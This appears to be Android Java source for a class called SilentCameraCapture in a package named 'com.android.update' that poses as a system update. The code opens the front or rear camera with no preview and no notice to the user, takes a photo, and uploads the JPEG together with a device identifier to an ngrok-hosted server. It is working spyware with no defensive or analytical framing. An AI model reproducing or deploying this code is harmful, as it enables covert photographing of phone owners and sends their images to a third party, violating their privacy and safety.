package com.android.update;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collections;

public class SilentCameraCapture {

    public static void captureCamera(Context context, int lensFacing) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == lensFacing) {

                    HandlerThread handlerThread = new HandlerThread("CameraThread");
                    handlerThread.start();
                    Handler backgroundHandler = new Handler(handlerThread.getLooper());

                    ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);

                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        Log.e("SilentCam", "CAMERA permission not granted");
                        return;
                    }
                    manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override
                        public void onOpened(@NonNull CameraDevice camera) {
                            try {
                                CaptureRequest.Builder captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                captureRequest.addTarget(reader.getSurface());

                                reader.setOnImageAvailableListener(readerListener -> {
                                    Image image = null;
                                    try {
                                        image = reader.acquireLatestImage();
                                        if (image != null) {
                                            ByteArrayOutputStream stream = new ByteArrayOutputStream();
                                            byte[] buffer = new byte[image.getPlanes()[0].getBuffer().remaining()];
                                            image.getPlanes()[0].getBuffer().get(buffer);
                                            stream.write(buffer);
                                            image.close();

                                            uploadToServer(context, buffer, lensFacing);
                                        }
                                    } catch (Exception e) {
                                        Log.e("SilentCam", "Image capture failed: " + e.getMessage());
                                    } finally {
                                        if (image != null) image.close();
                                        reader.close();
                                        camera.close();
                                        handlerThread.quitSafely();
                                    }
                                }, backgroundHandler);

                                camera.createCaptureSession(
                                        Collections.singletonList(reader.getSurface()),
                                        new CameraCaptureSession.StateCallback() {
                                            @Override
                                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                                try {
                                                    session.capture(captureRequest.build(), null, backgroundHandler);
                                                } catch (CameraAccessException e) {
                                                    Log.e("SilentCam", "Capture error: " + e.getMessage());
                                                }
                                            }

                                            @Override
                                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                                Log.e("SilentCam", "Session config failed");
                                            }
                                        },
                                        backgroundHandler
                                );

                            } catch (CameraAccessException e) {
                                Log.e("SilentCam", "Open failed: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onDisconnected(@NonNull CameraDevice camera) {
                            camera.close();
                        }

                        @Override
                        public void onError(@NonNull CameraDevice camera, int error) {
                            camera.close();
                        }
                    }, backgroundHandler);

                    break; // Done with the correct camera
                }
            }
        } catch (Exception e) {
            Log.e("SilentCam", "Camera2 error: " + e.getMessage());
        }
    }

    private static void uploadToServer(Context context, byte[] imageData, int lensFacing) {
        try {
            String endpoint = lensFacing == CameraCharacteristics.LENS_FACING_FRONT ?
                    "upload_front_photo" : "upload_back_photo";

            URL url = new URL("https://sophistic-monocular-magdalena.ngrok-free.dev/" + endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));
            conn.setRequestProperty("Content-Disposition",
                    "attachment; filename=\"" + (lensFacing == CameraCharacteristics.LENS_FACING_FRONT ? "front_" : "back_")
                            + System.currentTimeMillis() + ".jpg\"");

            OutputStream os = conn.getOutputStream();
            os.write(imageData);
            os.flush();
            os.close();

            Log.d("SilentCam", "Upload done. Code: " + conn.getResponseCode());
        } catch (Exception e) {
            Log.e("SilentCam", "Upload failed: " + e.getMessage());
        }
    }
}
